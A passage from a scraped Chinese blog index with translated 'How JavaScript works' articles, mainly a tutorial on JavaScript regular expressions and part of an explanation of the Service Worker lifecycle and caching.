每当想要和用户分享紧急，重要及紧迫的信息的时候，消息推送服务是用来通知用户的一个绝佳的方式。 参考资源 https://developers.google.com/web/fundamentals/push-notifications/ https://developers.google.com/web/fundamentals/push-notifications/how-push-works https://developers.google.com/web/fundamentals/push-notifications/subscribing-a-user https://developers.google.com/web/fundamentals/push-notifications/handling-messages","link":"/posts/ba2eb3c9.html"},{"title":"正则表达式","text":"How JavaScript works: regular expressions (RegExp) 原文请查阅这里 搜索，匹配和汇总是我们日常网络活动的重要组成部分。比如当你在浏览网页或 google 某些关键字时，就会进行大量搜寻。为了减少搜索/匹配的难度和提高精确度，诸如 Notepad 或 Sublime 等流行编辑器使用正则表达式来支持搜索和替换功能。因此当使用编辑器时你在在键盘上按 CTRL + F 时，就可以搜索和匹配选择的文本。 除了搜索，开发者可以使用正则表达式进行输入验证。例如，可以检查用户输入的 PIN 码是否全为数字，或者输入的密码是否具有特殊字符等。大多数开发者对正则表达式最喜欢的一点是其知识的可传递性。比如用 JavaScript 编写的正则表达式可以很轻松地迁移至 Python。 本文将解释 JavaScript 正则表达式，其重要性及特殊字符，还有如何有效地创建和编写它们，主要用例以及其不同的属性和方法。 什么是正则表达式正则表达式是用于匹配字符串中字符组合的模式。在 JavaScript中，正则表达式也是对象。 正则表达式使得字符串搜索和匹配更轻松快捷。例如在搜索引擎，日志和编辑器等中，就需要轻松高效地过滤/匹配文本。这正是正则表达式的用武之地，它用一系列字符定义了搜索模式。 正则表达式的重要性由于数字化转型的加速，信息成为越来越多的行业不可或缺的一部分。在本节我们将探索为什么正则表达式很重要以及它们在数据管理中的作用。 搜索/匹配字符串大多数正则表达式的使用是用于执行字符串的搜索和匹配。 正则表达式允许开发者在大量文本池搜索。搜索文本时，如果找到匹配文本则返回 true ，反之为 false。从一组文本中匹配一个文本时，开发者会得到一个包含预期文本（即与搜索模式匹配的文本）的数组。 输入验证对于大多数软件开发者，输入验证是一个重要功能。如果希望用户输入的 PIN 码全为数字，或正确使用 @xx.com 后缀输入电子邮件，实现类似功能时大多数开发者会使用到正则表达式。 下面是一个 RegExp 示例，以验证用户的输入确保他们的输入仅包含数字： 123let num = 1;let regex = new RegExp('[0-9]');console.log(regex.test(num)); // 返回值为 true 执行上面的代码会返回 true，因为 num 是介于0到9之间的数字。但是，如果将 num 的值更改为文本，则输出 false。 123let num = 'me';let regex = new RegExp('[0-9]');console.log(regex.test(num)); // 返回值为 false 网络爬虫网络爬虫涉及从网站提取数据。使用正则表达式，开发者可以轻松地执行此任务。例如可以通过指向网页并提取与其模式匹配的数据来。 数据预处理从网页抓取上的数据还有其他用处。比如基于决策目的，你可以评估来自网络的数据并整理成所需的格式。借助正则表达式可以聚合和映射数据以将其用于分析目的。 经过预处理的信息可以存储起来以备不时之需，使检索变得更加容易。 JavaScript 创建 RegExp 对象JavaScript 正则表达式是使用 RegExp 对象创建的。因此，正则表达式主要是JavaScript对象。前文使我们对正则表达式有了更好的了解，接下来我们一下如何在 JavaScript 中创建它们。 字面量字面量是在 JavaScript 中创建 RegExp 对象的一种方法。此方法涉及RegExp文字语法的使用。 RegExp 字面量将表达式用斜杠 / 包括而不是引号。 因为涉及 JavaScript 字面量的使用，也意味着这是运行时不能更改的固定值，使用字面量创建的正则表达式是一个常量。例如开发者不会想在循环中使用字面量。因为如果每次迭代后没有重新编译，则循环中的由字面量创建的值将不会改变。 以下代码是使用字面量创建 JavaScript 正则表达的语法： 1let re = /hello/ 让我们再看一个简单例子，它会在字符串中寻找完全匹配的字符。这将执行区分大小写的搜索： 123let re = \"Hello Studytonight\";let result = /hello/.test(re);console.log(result); // 输出 false 上面代码的执行结果是 false，因为 hello 不等于 Hello，这是区分大小写的搜索。上面的命令执行的操作是在文本 String Hello Studytonight 中搜索 hello。我们可以使用不区分大小写的 i 修饰符执行不区分大小写的搜索。让我们使用 i 修饰符对上面的示例进行调整: 123let re = \"Hello Studytonight\";let result = /hello/i.test(re);console.log(result); // 输出 true 这次程序将输出true，因为没有执行区分大小写的搜索，所以 Hello等同于 hello。 构造函数另一种创建正则表达式的方法是使用构造函数。此方法将正则表达式文本作为函数参数接收。从ECMAScript 6开始，构造函数现在可以接受正则表达式字面量。 需要注意的是使用构造函数创建的正则表达式，它们的模式可以在运行时发生改变。例如，在验证用户输入或执行循环迭代时。以下代码是使用构造函数创建 JavaScript 正则表达式的语法示例： 12let re = new RegExp('hello', 'g'); // 基于字符串构建let re = new RegExp(/hello/, 'g'); // 基于正则表达式字面量构建 (ES6) 就像字面量示例一样，我们将使用 RegExp 构造函数创建区分大小写的搜索： 123let str = \"Hello Studytonight\";let regex = new RegExp('hello');console.log(regex.test(str)); // 输出 false 接下来，我们将 i 修饰符添加到函数参数中，以忽略搜索中的区分大小写。 123let str = \"Hello Studytonight\";let regex = new RegExp('hello', 'i');console.log(regex.test(str)); // 输出 true 现在由于区分大小写的忽略，因此代码将输出 true。 正则表达式方法正则表达式有两个主要方法，分别是 exec() 和 test()。但还有其他用于正则表达式的 String 方法，如 match()，matchAll()，replace()，replaceAll()，search()和 split()。本节中我们将探讨用于 JavaScript 正则表达式的不同方法： exec()此方法执行搜索并返回结果数组或 null，可用于获取字符串中多个匹配项。 比如下面示例展示了 exec() 分别使用循环和不使用的代码。 1234567891011121314151617//without iterationlet regex1 = RegExp('fam*', 'g');let str1 = 'make family everything familiar';str1 = regex1.exec(str1);console.log(str1); //output fam, index:5//with iterationconst regex1 = RegExp('fam*', 'g');const str1 = 'make family everything familiar';let array1;while ((array1 = regex1.exec(str1)) !== null) { console.log(`Found ${array1[0]}. Next starts at ${regex1.lastIndex}.`); // outputs \"Found fam. Next starts at 8.\" // outputs \"Found fam. Next starts at 26.\"} 注意在没有迭代的情况下仅获得第一个匹配项的索引。但是通过迭代可以获得所有（多个）匹配项的结果。 test()此 RegExp 方法搜索正则表达式和字符串之间的匹配项。如果找到匹配项，则返回 true 或 false。还可以对此方法使用全局修饰符 g。让我们看一个示例，在带和不带全局修饰符 g 的字符串中搜索正则表达式。 1234567const str = 'in a space of time spark';const regex = new RegExp('spa');const globalRegex = new RegExp('spa', 'g');console.log(regex.test(str));// output: trueconsole.log(globalRegex.test(str));// output: true 在上面示例中，regex.test(str) 和 globalRegex.test(str) 均输出 true，因为可以在文本（space 和 spark内）找到匹配的 spa。 但全局修饰符允许开发者在搜索中进行迭代，以确定目标字符串中存在 spa 的次数及不同出现位置的索引。没有全局修饰符的话是无法实现的，因为 test()方法将在字符串中运行，从而确定 spa 是否存在，而不考虑它是否出现过一次或多次。下面代码对此进行了更好的解释： 123456789101112131415161718192021222324252627const str = 'in a space of time spark';const regex = new RegExp('spa');const globalRegex = new RegExp('spa', 'g');console.log(regex.test(str));//output: trueconsole.log(regex.lastIndex);// doesn’t matter what position. spa is present so it outputs 0console.log(regex.test(str));//output: trueconsole.log(regex.lastIndex);// doesn’t matter what position. spa is present so it outputs 0console.log(regex.test(str));//output: trueconsole.log(regex.lastIndex);// doesn’t matter what position. spa is present so it outputs 0console.log(globalRegex.test(str));// output: trueconsole.log(globalRegex.lastIndex);// output: 8console.log(globalRegex.test(str));// output: trueconsole.log(globalRegex.lastIndex);// output: 22console.log(globalRegex.test(str));// output: falseconsole.log(globalRegex.lastIndex);// output: 0 (because spa only occurs in position 8 and 22) test 方法的语法为 test(str)。str 是要匹配正则的字符串。与 search() 方法不同，此方法返回一个布尔值而不像 search() 返回匹配项的索引；如果找不到匹配项，则返回 -1。 match()此方法返回与正则表达式与文本匹配的结果数组而不是布尔值。让我们看一个示例，该示例将使用全局修饰符查找字符串中的所有匹配字母。全局修饰符用于遍历文本每个字母进行匹配。 1234const paragraph = 'TheGirl Fakesa Smile.';const regex = /F(a)[a-z]/g;const found = paragraph.match(regex);console.log(found); // Should return [\"Fak\"] 如果输入正则对象作为参数直接使用 match() 方法，则会得到一个空字符串数组。如果在此方法中不使用全局修饰符，则会得到与 exec()方法相同的结果。另外此方法还支持使用其他属性，比如groups, index, input等。 matchAll()matchAll() 方法必须配合全局修饰符来使用。与 match() 方法的区别在于它返回具有所有匹配组和捕获组的迭代器。在 match() 方法中，使用g修饰符不会返回捕获组，没有g修饰符的情况下将返回第一个匹配项以及相关捕获组。 全局修饰符对于 matchAll() 很重要，否则会报错。让我们看一下用matchAll()方法来执行 match 方法中的例子。 123456const paragraph = \"TheGirl Fakesa Smile.\";const regex = /F(a)[a-z]/g;const found = paragraph.matchAll(regex);//should print (2) [\"Fak\", \"a\", index: 8, input: \"TheGirl Fakesa Smile.\", groups: undefined].Array.from(found, (res) =&gt; console.log(res)); 上面的示例中返回了捕获组 a。在 match() 示例中则未返回此值。另外二者的语法是相同的。 replace()1234567const p = 'The girl is a beautiful girl';console.log(p.replace('girl', 'lady'));//output: \"The lady is a beautiful girl\" const regex = /girl/i;console.log(p.replace(regex, 'woman'));// output: \"The woman is a beautiful girl\" 上面例子中可以看到初始字符串 p 不变。产生变化的是返回结果。另外，第二个字符串 girl 也保持不变。 此方法语法如下所示： 123456// for RegExp patternreplace(regexp, newSubstr)replace(regexp, replacerFunction)// for String Patternreplace(substr, newSubstr)replace(substr, replacerFunction) replaceAll()此方法适用于使用正则替换文本中所有匹配文本。在 replace() 方法中，仅模式匹配的第一个文本被替换。但在 replaceAll() 会将所有匹配文本替换掉。让我们来看一下 replace() 方法中的相同示例。 二者的语法相同： 123456const p = 'The girl is a beautiful girl';console.log(p.replaceAll('girl', 'lady'));//output: \"The lady is a beautiful lady\" const regex = /girl/g;console.log(p.replaceAll(regex, 'woman')); //output: \"The woman is a beautiful woman\" search()搜索方法 search() 用于搜索正则表达式和字符串间的匹配项。此方法不输出布尔值或结果数组。而是输出一个数字，显示第一个匹配项的索引。 例如，下面的示例输出 4，为第一个大写 S 的索引。 123let str = \"the Soup Is Sour\"let re = /[A-Z]/gconsole.log(str.search(re)) //This should output 4 split() 非正则对象的方法 split 方法用于从字符串中提取子字符串。此方法的作用是根据我们的模式将字符串分为子字符串。然后，它将返回一个包含所有子字符串的数组。比如可以使用该方法将字符串分割为单词，字符等。 123456789101112const str = 'The house is beautiful and spacious';const words = str.split(' ');console.log(words[3]);//output: \"beautiful\" const chars = str.split('');console.log(chars[8]);//output: \"e\" const strCopy = str.split();console.log(strCopy);//output: Array [\"The house is beautiful and spacious\"] split 方法的相关语法如下： 123split()split(separator)split(separator, limit) 分隔符描述每个拆分应该在哪里发生。分隔符可以是字符串或正则表达式。开发者传入参数 limit，此参数规定了包含数组中的子字符串数量。例如，如果 limit 为 0，则将返回一个空数组 []。 正则编写在 JavaScript 中，可以使用简单的模式、特殊字符和来编写正则表达式。在本节中，我们将探索编写正则表达式的不同方法，同时重点关注简单模式、特殊字符和修饰符。 简单模式有时在搜索文本，会希望获得完全匹配。例如，如果您想在“Blessing made good fries by frying fr yosh’s potatoes” 这句话中搜索 “fry”。你不会想要得到诸如 “fr yosh’s” 或“fries” 之类的结果，而是像“frying”这样的精确匹配。这就是简单模式的内容，使用简单的模式，您可以创建模式以获得精确匹配。它们大多仅由字符组成。 下面是一个简单的例子。它允许我们创建一个精确匹配字符串“fry”的搜索。 12345const paragraph = 'Blessing makes good fries by frying fr yosh’s potatoes.';// characters f-r-yconst regex = /fry/;console.log(paragraph.search(regex));// 29 特殊字符有时候我们要求搜索不必精确。例如，我们可能想进行范围搜索。您可能想要搜索字母 a — c，无论字符串中是否有空格。为此，开发人员需要使用特殊字符。 JavaScript 中 RegExp 的特殊字符分为以下几类：断言、字符类、分组和范围、量词和 Unicode 属性转义。让我们看看如何在这些类别中使用特殊字符。 断言RegExp 中的断言表示模式边界。使用断言可以指明单词的开头和结尾。还可以使用以下表达式为匹配编写模式：前瞻、后瞻和条件语句。 对于边界类型断言，您可以使用 ^、$、\\b 或 \\B 等字符。 ^ — 此字符用于匹配输入的开头。如果将 multiline 修饰符设置为 true，则该字符可以在换行符后立即匹配。 $ - 匹配输入的结尾。如果将 multiline 修饰符设置为 true，则此字符可以在换行符之前立即匹配。 \\b — 此字符匹配单词边界。也就是说，在一个单词字符之后或之前没有另一个单词字符的地方。 \\B — 此字符匹配非单词边界。也就是说，前一个和下一个字符的类型相同：两者都必须是单词或非单词。例如，字母后不能跟空格。 对于前瞻断言和后瞻断言之类的表达式，请使用以下字符： x(?=y) — 此字符语法用于前瞻断言。仅当 x 后跟 y 时，语法才会匹配 x。将 x 和 y 替换为您选择的值以执行断言。例如，/Man(?=Money)/ 仅在后跟 “money” 时才匹配 “man”。 x(?!y) — 用于否定前瞻断言。只有当它后面没有 y 时，它才会匹配 x。例如，/Man(?=Money)/ 只会在后面没有跟 “money” 的情况下匹配 “man”。 (?&lt;=y)x — 此语法用于后瞻断言。仅当 x 前面有 y 时，它才会匹配 x。例如，/Man(?=Money)/ 仅当它前面有 “money” 时才会匹配 “man”。 (?&lt;!y)x — 用于否定后瞻断言。只有当它前面没有 y 时，它才会匹配 x。例如，/Man(?=Money)/ 仅当前面没有 “money” 时才会匹配 “man”。 让我们用讨论过的特殊字符和断言来看看下面的例子。 123456789101112131415161718192021222324252627282930313233343536373839404142let str = `let the river dry up`; // 1) Use ^ to fix the matching at the begining of the string, and right after newline.str = str.replace(/^l/,'h');console.log(1, str); //This will change the l in \"let to h\"// 输出 1 \"het the river dry up\" //2) Use $ to fix the matching at the end of the string, and right before a newline.let str1 = `let the river dry up`;str1 = str1.replace(/p$/,'n');console.log(2, str1); //This will change the p in \"up\" to n// 输出 2 \"let the river dry un\" //2) Use \\b to match a word boundarylet str2 = `let the river dry up`;str2 = str2.replace(/\\bl/,'n');console.log(3, str2); //This will change the l in \"let to n\"// 输出 3 \"net the river dry up\" //2) Use \\B to match a non-word boundarylet str3 = `let the river dry up`;str3 = str3.replace(/\\Bt/,'y');console.log(4, str3); //This will change the t in \"let\" to y// 输出 4 \"ley the river dry up\" //look ahead assertionlet str4 = \"let usmake light\"str4 = str4.replace(/us(?=make)/, 'them');console.log(str4);// 输出 let themmake light //negative look ahead assertionlet str5 = \"let us make light\"str5 = str5.replace(/us(?!let)/, 'everyone');console.log(str5);// 输出 let everyone make light //look behind assertionlet str6 = \"letus make light\"str6 = str6.replace(/(?&lt;=let)us/, 'them');console.log(str6);// 输出 letthem make light 字符类字符类用于区分不同的字符。比如可以使用字符类区分字母和字母。让我们看看带有字符类的特殊字符以及它们是如何工作的。 \\d — 该字符匹配一个数字。即 0-9 之间的数字。您可以使用此字符 /\\d/ 或 /[0–9]/ 来匹配数字。 \\D — 用于匹配任何非数字字符。 /\\D/ 等价于 /[^0-9]/。 \\w — 此字符用于匹配基本拉丁字符中的字母数字。 /\\w/ 等价于 [A-Za-z0–9_]。 \\W — 用于匹配非字母数字字符。即非基本拉丁字母数字。 /\\W/ 等价于 [^A-Za-z0–9_]。 \\s — 用于匹配单个空白字符。即空格、制表符、换页、换行和其他 Unicode 空格。 /\\s/ 等价于 [ \\f\\n\\r\\t\\v\\u00a0\\u1680\\u2000-\\u200a\\u2028\\u2029\\u202f\\u205f\\u3000\\ufeff]。 . — 点号用于匹配除 \\n、\\r、\\u2028 和 \\u2029 等换行符外的单个字符。 [\\b] — 此字符用于匹配退格。 \\0 — 这匹配一个空字符。 \\xhh — 此语法用于匹配具有两个十六进制数字的字符 (x)。 \\uhhhh — 此语法用于匹配带有十六进制数字的 UTF-16 代码单元。 \\cX — 这用于匹配使用脱字符表示法的一个控制字符。 还有其他特殊字符如 \\t、\\r、\\n、\\v、\\f，它们分别匹配水平制表符、回车、换行、垂直制表符和换页符。现在让我们看一个简单的例子，展示字符类中这些特殊字符的用法： 123456789const chess = 'She played the Queen in C4 and he moved his King in c2.';const coordinates = /\\w\\d/g;console.log(chess.match(coordinates));// expected output: Array [ 'c4', 'c2']const mood = 'happy 🙂, confused 😕, sad 😢';const emoji = /[\\u{1F600}-\\u{1F64F}]/gu;console.log(mood.match(emoji));// expected output: Array ['🙂', '😕', '😢'] 分组和范围如果您想对表达式字符进行分组或指定范围，则可以使用以下特殊字符。 x|y — 此语法用于匹配 x 或 y。例如，表达式 man|woman 将匹配字符串中的 “man” 或 “woman”。 [xbz] — 用于匹配括号内的任何字符。例如，[xbz] 将匹配字符串中的 “x”、 “b”、 “z”。 [a-c] — 用于匹配括号中字符范围内的任何字符。例如，[a-c] 将匹配 “a”、 “b” 和 “c”。但是，如果连字号位于括号的开头或结尾，则将其视为普通字符。因此，[-ac] 将匹配 “non-profit” 中的连字符。 [^xyz] — 这将匹配未在括号中的任何字符。例如，[^xyz] 不会匹配 “Lazy” 中的 “y” 和 “z”，但会匹配 “L” 和 “A”。 [^a-c] — 这将匹配括号中包含的字符范围以外的任何内容。例如，[^a-c] 不会匹配 “bank” 中的 “b” 和 “a”，但会匹配 “n” 和 “k”。 (x) — 此字符用于捕获组。例如，(x) 将匹配字符 “x” 并记住匹配的字符以供后续引用使用。例如 /(family)/ 像在捕获组中一样匹配并记住 “make family familiar” 中的 “family”。因此，如果在 “make family familiar” 中替换 “family”，则文本将更改为在所有代码中替换 “family” 的内容。 \\n — 此语法用作最后一个子字符串的反向引用，匹配正则表达式中的组号 “n”，其中 “n” 是正整数。 \\k&lt;Name&gt; — 此语法是对最后一个子字符串的反向引用，匹配由 指定的命名捕获组。 (?&lt;Name&gt;x) — 此语法用于名称捕获组。它匹配 x 并将其存储在 指定的名称下的返回匹配项的组属性中。 (?:x) — 适用于非捕获组。在这种情况下，模式匹配 x 但不记得匹配。因此开发者无法从结果数组中调用匹配的子字符串。 我们已经讨论了用于组和范围的不同特殊字符。现在，让我们看看他们的实际作用。 12345678910111213141516171819let str1 = `let the river dry up`;str1 = str1.replace(/let|the/, 'm');console.log(1, str1); //This will output m the river dry uplet str2 = `let the river dry up`;str2 = str2.replace(/[abcde]/, 'o');console.log(2, str2); //This will output lot the river dry uplet str3 = `let the river dry up`;str3 = str3.replace(/[^abcde]/, 'o');console.log(3, str3); //This will output oet the river dry uplet str4 = \"Sir, yes Sir in Do you copy? Sir, yes Sir!\";str4 = str4.replace(/(?&lt;title&gt;\\w+), yes \\k&lt;title&gt;/, \"Hello\");console.log(4, str4); //This will output Hello in Do you copy? Sir, yes Sir! 量词匹配字符时，有时需要指定要匹配的表达式或字符的数量。量词允许开发者指明想要匹配的表达式或字符的数量。让我们看看正则表达式中用作量词的特殊字符。 x* — 此语法用于匹配前面的项 x 零次或多次。例如，/bo*/ 匹配 “bird” 中的 “b” 而单词 “goat” 中则没有匹配。 x+ — 此语法与前面的项 x 匹配一次或多次。 /x+/ 等价于 {1,}。 X？ — 此语法将匹配前一项 x 零次或一次。 x{n} — 此语法允许精确匹配前项 x 出现 “n” 次，其中 “n” 是正整数。 x{n,} — 您可以匹配前面项 x 的所有出现次数等于或大于 “n”，而不是精确匹配前一项 x 的 “n” 次出现。其中 “n” 是正整数。 x{n,m} - 其中 n 是正整数或零，m 是正整数，并且 m 大于“n”，用于匹配前一项的至少 “n” 和最多 “m” 次出现x 。 默认情况下，像 * 和 + 这样的量词尝试在字符串中尽可能多地匹配。因此，他们被称为贪婪。而 ？字符使量词变为非贪婪模式，因此会在第一次遇到匹配后停止。 让我们看一个如何在正则表达式中使用量词的例子： 1234567891011121314151617181920212223242526272829let str = `let the river dry up`;str = str.replace(/et*/,'a');console.log(1, str); // This will change \"let\" to la\" let str1 = `let the river dry up`;str1 = str1.replace(/e+/,'a');console.log(2, str1); // This will change \"let\" to lat\" let str2 = `let the river dry up`;str2 = str2.replace(/e?et?/,'a');console.log(3, str2); // This will change \"let\" to la\" let str3 = `let the riveer dry up`;str3 = str3.replace(/e{2}/,'a');console.log(4, str3); // This will change \"riveer\" to \"rivar\" let str4 = `let the riveer dry up`;str4 = str4.replace(/e{2,}/,'a');console.log(5, str4); // This will change \"riveer\" to \"rivar\" let str5 = `let theee riveer dry up`;str5 = str5.replace(/e{1,3}/,'a');console.log(6, str5); // This will change the \"let\" to lat\" Unicode 属性转义可以根据字符的 Unicode 属性匹配字符。使用 Unicode 属性转义，您可以匹配表情符号、标点符号、来自特定语言的字母或脚本。 Unicode 属性的正则表达式必须具有 u 修饰符。此外，您可以为二进制和非二进制值编写 Unicode 属性。 编写 Unicode 属性转义的语法如下： 12345678910//Syntax for non-binary values\\p{UnicodePropertyValue}\\p{UnicodePropertyName=UnicodePropertyValue} // Syntax for binary and non-binary values\\p{UnicodeBinaryPropertyName} // Syntax for negation: \\P is negated \\p\\P{UnicodePropertyValue}\\P{UnicodeBinaryPropertyName} 下面的例子展示了如何在正则表达式中使用 Unicode 属性转义： 12345678910111213const paragraph = 'A ticket to 大阪 costs ¥2000 👌.'; const emoji = /\\p{Emoji_Presentation}/gu;console.log(paragraph.match(emoji));// expected output: Array [\"👌\"] const nonLatin = /\\P{Script_Extensions=Latin}+/gu;console.log(paragraph.match(nonLatin));// expected output: Array [\" \", \" \", \" 大阪 \", \" ¥2000 👌.\"] const currencyOrPunctuation = /\\p{Sc}|\\p{P}/gu;console.log(paragraph.match(currencyOrPunctuation));// expected output: Array [\"¥\", \".\"] 修饰符JavaScript 中的正则表达式有七个修饰符。这些修饰符增强了正则表达式模式。例如， i 修饰符用于不区分大小写的搜索。您可以单独或一起使用修饰符，它们可以作为正则表达式的一部分包含在内。让我们看看这些修饰符以及其用途： d — 此修饰符用于为子字符串匹配生成索引。 g — 用于指示全局搜索。 i — 用于不区分大小写的搜索。如果要在不强制区分大小写的情况下执行搜索，请使用此修饰符。 m — 用于执行多行搜索。 u — 表示 Unicode；它将模式视为一系列 Unicode 代码点。 y — 用于执行粘性搜索。 s - 允许 . 字符匹配换行符。 要在正则表达式中使用修饰符，请使用以下语法 : 12345//for literal notationvar re = /pattern/flags;// or//for constructor functionvar re = new RegExp('pattern', 'flags'); 什么时候不该用正则表达式到目前为止，我们已经探索了正则表达式，它们在 JavaScript 中是如何工作的以及为什么要使用它们。但某些情况下，最好使用其他工具而不是 RegExp。在以下场景中使用正则表达式是一种不好的做法： 使用 RegExp 解析 HTML 不是一个好习惯，因为 HTML 不是常规语言。通常，源代码不是常规语言，不应使用 RegExp 进行解析。 使用比 RegExp 更好的工具或内置 URL 解析器来解析 URL 的路径和查询参数。因为使用 RegExp 无法获得标记化输出。 尽管开发人员可以使用 RegExp 来查找或验证电子邮件，但尝试这样做时事情会变得非常复杂，这是一个示例。 尽管正则表达式的知识是“可转移的”，但学习并非一蹴而就。如果想更深入地了解 RegExp，本文档是不错的选择。此外，在 JavaScript 中还有不错的工具，例如 RegExr、Regex tester 和 Regex Visualizer 等。 积累了更深入的正则表达式知识后，开发人员可以更好地决定应用的时机。有许多现实生活中的例子表明正则表达式是解决某个问题的最佳方法。这不仅适用于 JavaScript 和前端，同样也适用于后端。 题外话原本这一篇只翻了一半，由于后续 PR 会合并到 Troland 大佬的仓库而且官方也更新了不少文章还是决定有空继续翻一下。不一定后续的每篇译文都会放到这里来，查看最新修订后的内容可以到这里。","link":"/posts/2f57a694.html"},{"title":"Service Workers生命周期及其使用场景","text":"How JavaScript works: Service Workers, their lifecycle and use cases 原文请查阅这里，略有删减. 你可能已经了解渐进式网络应用会越来越流行，因为它旨在创造拥有更加流畅的用户体验的网络应用和创建类 App 的原生应用体验而非浏览器端那样的外观和体验。 构建渐进式网络应用的主要需求之一是使其在各种网络和数据加载的条件下非常可靠－它可以在网络不稳定甚至没有网络的情况下使用。 本章中我们将深入了解 Service Workers：它们是如何工作的以及你所应该关心的方面。最后，我们将会列出一些你应该利用的 Service Workers 独有的优势并分享我们在 SessionStack 中的实践经验。 概述若想理解 Service Workers 相关的一切，你首先应该阅读第七章 Web Workers 。 大体上，Service Worker 是一种 Web Worker，更准确地说，它更像是一个 Shared Worker。 Service Worker 运行在自身的全局脚本上下文 不和特定网页绑定 不能够访问 DOM Service Worker API 令人激动的原因之一即它使得你的网络应用支持离线运行，这样开发者能够完全控制网络应用的流程。 Service Worker 生命周期Service Worker 的生命周期和网页完全不相关。它由以下几个步骤组成： 下载 安装 激活 下载这发生于浏览器下载包含 Service Worker 相关代码的 .js 文件。 安装为了在网络应用中安装 Service Worker，首先得在 JavaScript 代码中对其进行注册。当 Service Worker 被注册时，浏览器会弹出在后台开始安装 Service Worker 步骤的提示。 通过注册 Service Worker，浏览器知晓包含 Service Worker 相关代码的 JavaScript 文件位置。看下如下代码： 1234567891011if ('serviceWorker' in navigator) { window.addEventListener('load', function() { navigator.serviceWorker.register('/sw.js').then(function(registration) { // 注册成功 console.log('ServiceWorker registration successful'); }, function(err) { // 注册失败 console.log('ServiceWorker registration failed: ', err); }); });} 以上代码先检查当前环境是否支持 Service Worker API。如果是，则注册 /sw.js Service Worker。 你可以任性地在每次页面加载的时候任意调用 register()－浏览器会检测 service worker 是否已经注册从而进行适当地处理。 register() 方法一个需要注意的点是 Service Worker 文件地址。当前示例是在服务器根域名下。意即 service worker 会作用于整个源。换句话说，即 service worker 会接收到该域名下所有页面 的 fetch 事件。如果注册 service worker 的文件路径是 /example/sw.js ，那么 service worker 会接收到所有页面路径以 /example/ 为开头的 URL 地址的 fetch 事件（比如 /example/page1/ /example/page2/）。 在安装阶段，最好加载和缓存一些静态资源。一旦静态资源缓存成功，Service Worker 的安装也就完成了。倘若加载失败－Service Worker 将会重试。一旦安装成功，静态资源也就缓存成功了。 这也就回答了为什么是在 load 事件之后注册 Service Worker。这不是军规，但强烈推荐这么做。 为什么呢？假设用户第一次访问该网络应用。尚未注册 service worker，而且浏览器无法事先知晓是否会最终安装它。如果进行安装，则浏览器选用对额外的线程开辟对应的 CPU 和内存，而这些资源原本是用来渲染网页的。 参考下这里，load 事件会加载完所有的资源比如图片，样式之后触发。 最终的结果是如果在页面安装 Service Worker，有可能导致页面延迟加载和渲染－无法让用户尽快地访问网页。 需要注意的是这只会发生在第一次访问页面的时候。后续的页面访问不会被 Service Worker 的安装所影响。一旦在首次访问页面时激活了 Service Worker ，它就可以处理后续的页面访问所触发的页面加载/缓存事件。这是正确的，Service Worker 需要加载好以处理有限的网络带宽。 激活安装完之后下一步即激活。该步骤是操作之前缓存的绝佳时机。 一旦激活，Service Worker 就可以开始控制在其作用域内的所有页面。一个有趣的事实即：注册了 Service Worker 的页面直到再次加载的时候才会被 Service Worker 进行处理。当 Service Worker 开始进行控制，它有以下几种状态： 处理来自页面的网络或者消息请求所触发的 fetch 及 message 事件 被中止以节约内存 以下即其生命周期： 处理 Service Worker 内部的安装过程在页面运行注册 Service Worker 的过程中，让我们来看看 Service Worker 脚本中发生的事情，它监听 Service Worker 实例的 install 事件。 以下为处理 install 事件所需要执行的步骤： 打开缓存 缓存文件 确认是否所有的静态资源已缓存 以下为一个 Service Worker 内部可能的简单安装代码： 123456789101112131415161718var CACHE_NAME = 'my-web-app-cache';var urlsToCache = [ '/', '/styles/main.css', '/scripts/app.js', '/scripts/lib.js'];self.addEventListener('install', function(event) { // event.waitUntil 使用 promise 来获得安装时长及安装是否失败 event.waitUntil( caches.open(CACHE_NAME) .then(function(cache) { console.log('Opened cache'); return cache.addAll(urlsToCache); }) );}); 如果所有文件都成功缓存，则 service worker 安装成功。如果任意文件下载失败，那么 service worker 将会安装失败。因此，请注意需要缓存的文件。 处理 install 事件完全是可选，当不进行处理的时候，跳过以上几个步骤即可。 缓存运行时请求该部分才是干货。在这可以看到如何拦截请求然后返回已创建的缓存（以及创建新的缓存）。 当 Service Worker 安装完成之后，用户会导航到另一个页面或者刷新当前页面，Service Worker 将接收到 fetch 事件。这里有一个演示了如何返回缓存的静态资源或执行一个新的请求并缓存返回结果的过程的示例： 123456789101112131415161718192021222324252627282930313233343536self.addEventListener('fetch', function(event) { event.respondWith( // 该方法查询请求然后返回 Service Worker 创建的任何缓存数据。 caches.match(event.request) .then(function(response) { // 若有缓存，则返回 if (response) { return response; } // 复制请求。请求是一个流且只能被使用一次。因为之前已经通过缓存使用过一次了，所以为了在浏览器中使用 fetch，需要复制下该请求。 var fetchRequest = event.request.clone(); // 没有找到缓存。所以我们需要执行 fetch 以发起请求并返回请求数据。 return fetch(fetchRequest).then( function(response) { // 检测返回数据是否有效 if(!response || response.status !== 200 || response.type !== 'basic') { return response; } // 复制返回数据，因为它也是流。因为我们想要浏览器和缓存一样使用返回数据，所以必须复制它。这样就有两个流 var responseToCache = response.clone(); caches.open(CACHE_NAME) .then(function(cache) { // 把请求添加到缓存中以备之后的查询用 cache.put(event.request, responseToCache); }); return response; } ); }) );}); 大概的流程如下： event.respondWith() 会决定如何响应 fetch 事件。 caches.match() 查询请求然后返回之前创建的缓存中的任意缓存数据并返回 promise。 如果有，则返回该缓存数据。 否则，执行 fetch 。 检查返回的状态码是否是 200。同时检查响应类型是否为 basic，即检查请求是否同域。当前场景不缓存第三方资源的请求。 把响应数据添加到缓存中。 因为请求和响应都是流而流数据只能被使用一次，所以必须进行复制。而且由于缓存和浏览器都需要使用它们，所以必须进行复制。 更新 Service Worker当用户访问网络应用的时候，浏览器会在后台试图重新下载包含 Service Worker 代码的 .js 文件。 如果下载下来的文件和当前的 Service Worker 代码文件有一不同，浏览器会认为文件发生了改变并且会创建一个新的 Service Worker。 创建新的 Service Worker 的过程将会启动，然后触发 install 事件。然而，旧的 Service Worker 仍然控制着网络应用的页面意即新的 Service Worker 将会处于 waiting 状态。 一旦关闭网络应用当前打开的页面，旧的 Service Worker 将被浏览器杀死而新的 Service Worker 就会取而代之。这时候将会触发 activate 事件。 为什么这一切是必须的呢？这是为了避免在不同选项卡中同时运行不同版本的的网络应用所造成的问题－一些在网页中实际存在的问题且有可能会产生新的 bug（比如当在浏览器中本地存储数据的时候却拥有不同的数据库结构）。 从缓存中删除数据activate 回调中最常见的步骤即缓存管理。因为若想删除安装步骤中老旧的缓存，而这又会导致 Service Workers 无法获取该缓存中的文件数据，所以这时候需要进行缓存管理。 